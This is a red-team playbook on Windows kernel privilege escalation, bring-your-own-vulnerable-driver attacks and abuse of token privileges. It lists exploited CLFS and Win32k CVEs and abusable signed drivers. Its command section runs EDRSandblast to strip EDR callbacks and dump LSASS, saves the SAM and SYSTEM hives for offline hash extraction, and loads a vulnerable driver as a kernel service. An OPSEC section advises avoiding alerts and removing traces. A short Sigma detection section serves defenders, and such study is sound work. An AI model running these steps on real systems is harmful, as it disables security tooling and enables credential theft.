# Kernel EoP, BYOVD & Privileged-Token-Right Abuse

ATT&CK: T1068 (Exploitation for Privilege Escalation), T1211 (Exploitation for Defense Evasion),
T1562.001 (Impair Defenses: Disable/Modify Tools), T1134 (Access Token Manipulation),
T1547.006 (Kernel Modules and Extensions). CWE-416 (Use After Free), CWE-415 (Double Free),
CWE-362 (Race Condition), CWE-782 (Exposed IOCTL with Insufficient Access Control),
CWE-269 (Improper Privilege Management).

## Theory / Mechanism

Two routes to kernel/SYSTEM once a local foothold exists:

1. **Local kernel EoP CVE** — exploit an unpatched bug in a Windows kernel component (CLFS, Win32k,
   kernel scheduler) to corrupt kernel memory and overwrite the current process **token** (set its
   `Privileges`/elevate, or swap in the SYSTEM token / set all-bits). The exploit needs only
   low-priv local code execution.
2. **BYOVD (Bring Your Own Vulnerable Driver)** — *not* an initial-access or unpriv-escalation
   technique: it requires **local admin** already. Windows enforces Driver Signature Enforcement
   (DSE), so attackers load a *legitimately signed but vulnerable* driver and abuse its exposed IOCTLs
   (arbitrary kernel R/W, `MmMapIoSpace`, MSR access, `ZwTerminateProcess`) to reach ring-0 — to kill
   EDR, strip kernel callbacks/hooks, or flip a process to PPL/SYSTEM. Microsoft's Vulnerable Driver
   Blocklist (`DriverSiPolicy.p7b`) lags active exploitation by months; attackers pick un-blocklisted
   signed drivers (legacy 2013–2016 builds lacking CFG, or brand-new releases not yet listed).

3. **Privileged token-right abuse** — when the token already holds a powerful right, no exploit is
   needed: the right *is* the primitive (see table below).

## Modern 2024-2026 kernel CVEs (verified)

| CVE | Component | Class | Status / notes |
|-----|-----------|-------|----------------|
| **CVE-2025-29824** | CLFS driver | UAF (CWE-416) | Patched **Apr 8 2025**; 0-day exploited in the wild (Storm-2460/PipeMagic → RansomEXX). Leaks kernel addrs via `NtQuerySystemInformation`, corrupts memory, `RtlSetAllBits` overwrites process token to `0xFFFFFFFF` (all privileges). **Win11 24H2 not affected** — NtQSI info classes now gated behind SeDebugPrivilege. |
| **CVE-2025-32701** | CLFS driver | UAF (CWE-416) | Patched **May 2025** (KB5058405/KB5058379); actively exploited; local → SYSTEM. |
| **CVE-2025-24983** | Win32k subsystem | UAF/EoP | PipeMagic-delivered 0-day (prior to 29824). |
| **CVE-2025-62215** | Windows kernel | race → double-free (CWE-362/415) | Patched **Nov 11 2025**, CVSS 7.0, **exploited in the wild** (MSTIC-discovered, CISA KEV Nov 12). Multi-thread race double-frees a kernel object → heap corruption → SYSTEM. Affects Win10 (incl. ESU)/11/Server 2022/2025. Exploit-level internals NOT publicly confirmed — treat third-party PoCs skeptically. |
| **CVE-2024-49138 / CVE-2024-49019** | CLFS / ADCS EKUwu | EoP | Part of CLFS's long abuse history; 49019 (EKUwu) is the ADCS ESC15 template bug. |

> Practical: map the host's `wmic qfe` / build against this table. CLFS is repeatedly hit — if the
> host is below the relevant KB and not 24H2, the CLFS path may be live. Otherwise, fall back to BYOVD.

## Modern 2024-2026 BYOVD (verified)

- **CVE-2025-7771 — `ThrottleStop.sys`**: signed driver exposing IOCTLs for arbitrary physical-memory
  R/W via `MmMapIoSpace`; patch the running kernel / invoke arbitrary kernel functions at ring-0. Used
  in a Dec 2025 red-team precisely because it was reported-but-not-yet-blocklisted.
- **CVE-2025-8061 — Lenovo driver** (Quarkslab): MSR R/W → overwrite **LSTAR** MSR (address of
  `KiSystemCall64`) to redirect a syscall to attacker shellcode → ring-0 exec. **Must restore LSTAR
  immediately** or any subsequent syscall BSODs the box.
- Fresh un-blocklisted drivers cataloged through 2025-2026: `GameDriverX64.sys` (CVE-2025-61155),
  `K7RKScan.sys` (CVE-2025-52915/CVE-2025-1055), `PCTcore64.sys` (CVE-2026-8501),
  `STProcessMonitor.sys` (CVE-2025-70795). Source candidates from **LOLDrivers** + MS blocklist.
- **EDRSandblast** weaponizes a vulnerable driver to strip kernel EDR callbacks/hooks and dump LSASS.
- **Driverless admin→kernel**: `GodFault` (+ `PPLFault`) reach kernel/PPL **without** a vulnerable
  driver — removing the BYOVD requirement that EDRSandblast historically needed.
- Classic abused drivers still in rotation: `RTCore64.sys` (MSI Afterburner), `gdrv.sys`,
  `mhyprot2.sys` (Genshin anti-cheat — `ZwTerminateProcess` to kill AV), `procexp.sys`.

## Privileged-token-right abuse (no exploit needed)

| Right | Primitive | Command |
|-------|-----------|---------|
| **SeBackupPrivilege** | Read any file ignoring DACL | `reg save HKLM\SAM sam` + `reg save HKLM\SYSTEM sys`; or `robocopy /b`; then `impacket-secretsdump -sam sam -system sys LOCAL` |
| **SeRestorePrivilege** | Write any file/registry ignoring DACL | Overwrite a protected service binary/DLL; plant DLL for hijack; modify `HKLM\...\Services` |
| **SeTakeOwnershipPrivilege** | Own any object | `takeown /f C:\Windows\System32\<svc>.exe`, then re-ACL + replace |
| **SeLoadDriverPrivilege** | Load a kernel driver | BYOVD: register service for an un-blocklisted signed driver, `NtLoadDriver` |
| **SeDebugPrivilege** | Open/inject/dump any process | Token theft from SYSTEM proc (see token ref); LSASS dump |
| **SeManageVolumePrivilege** | Full volume / raw-disk access | Read raw NTFS bypassing ACLs; arbitrary write → plant DLL |

## Complete working commands

```cmd
:: Map build to CVEs
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get HotFixID,InstalledOn

:: BYOVD with EDRSandblast (admin) — blind EDR + dump LSASS
EDRSandblast.exe --kernelmode dump_lsass --usermode unhook
EDRSandblast.exe --kernelmode unhook_callbacks      :: strip kernel notify routines

:: SeBackupPrivilege -> grab SAM/SYSTEM offline (no LSASS touch)
reg save HKLM\SAM  C:\Windows\Tasks\sam
reg save HKLM\SYSTEM C:\Windows\Tasks\sys
:: off-host: impacket-secretsdump -sam sam -system sys LOCAL

:: SeLoadDriverPrivilege -> load an un-blocklisted vulnerable driver
sc create vulndrv type= kernel binPath= C:\Windows\Tasks\ThrottleStop.sys
sc start vulndrv
:: then DeviceIoControl the driver's IOCTLs (see scripts/byovd_loader.c)
```

`scripts/byovd_loader.c` is a minimal, generic BYOVD harness: it installs/starts a driver service via
the SCM, opens the device, and issues a parameterised `DeviceIoControl` (IOCTL + input buffer from
argv) so you can drive arbitrary-R/W drivers — with explicit unload+delete cleanup. **Verify the
target driver is not on the Microsoft blocklist for the host build before loading.**

## Detection

```yaml
title: Vulnerable / Unexpected Kernel Driver Loaded (BYOVD)
logsource: { product: windows, service: system }
detection:
  svc:   { EventID: 7045, ServiceType: 'kernel mode driver' }
  load:  { EventID: 6, Signed: 'true', ImageLoaded|contains: ['\Temp\','\Tasks\','\ProgramData\','\Users\'] }  # Sysmon driver load
  known: { ImageLoaded|endswith: ['\RTCore64.sys','\gdrv.sys','\mhyprot2.sys','\ThrottleStop.sys','\procexp.sys'] }
  condition: svc or load or known
level: high
---
title: Token Privileges Suddenly Elevated / SYSTEM Token on Low-Priv Process
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 4672 }     # special privileges assigned at logon — correlate w/ low-priv user
  condition: sel
level: medium
```
IOCs: 7045 *kernel-mode driver* service install from a user-writable path; signed `.sys` loaded from
`Temp`/`Tasks`/`ProgramData`; known-vulnerable driver hashes (cross-ref LOLDrivers); EDR agent process
suddenly losing kernel callbacks; a low-priv process acquiring SeDebug/all-privileges (token swap
ETW Threat-Intel). For the in-the-wild CLFS/kernel 0-days: 4672/4688 of SYSTEM child under a low-priv
parent; LSASS access immediately after exploitation.

## OPSEC

- Driver load is **loud and persistent** (7045 + on-disk `.sys` + registry service). Confirm the
  driver is *not* blocklisted for the build, load it, do the work, then **stop + delete the service
  and remove the `.sys`**. HVCI/Memory-Integrity blocks many BYOVD loads outright — check first.
- If you overwrite an MSR (LSTAR) or patch DSE, **restore the original value immediately** — a missed
  restore BSODs the host and burns the engagement.
- Token-right abuse (`SeBackup`/`SeRestore`) is far quieter than a kernel exploit — prefer it when the
  right is present. `reg save HKLM\SAM` is itself alertable; stage hives to a benign path and parse
  off-host.
- Prefer driverless admin→kernel (`GodFault`) where it applies to avoid the durable driver IOC.

## References
- Microsoft Security Blog — "Exploitation of CLFS zero-day leads to ransomware activity"
  (CVE-2025-29824, Apr 2025); SOC Prime / Windows Forum — CVE-2025-32701, CVE-2025-62215
- ZDI — Nov 2025 Security Update Review (CVE-2025-62215); CISA KEV catalog (Nov 12 2025)
- Quarkslab — "BYOVD to the next level: exploiting a vulnerable Lenovo driver (CVE-2025-8061)"
- xavibel.com — "CVE-2025-7771: Exploiting a Signed Kernel Driver (ThrottleStop.sys)"
- LOLDrivers project; Microsoft Vulnerable Driver Blocklist; wavestone-cdt/EDRSandblast;
  Elastic Security Labs — "Forget vulnerable drivers - Admin is all you need" (GodFault/PPLFault)
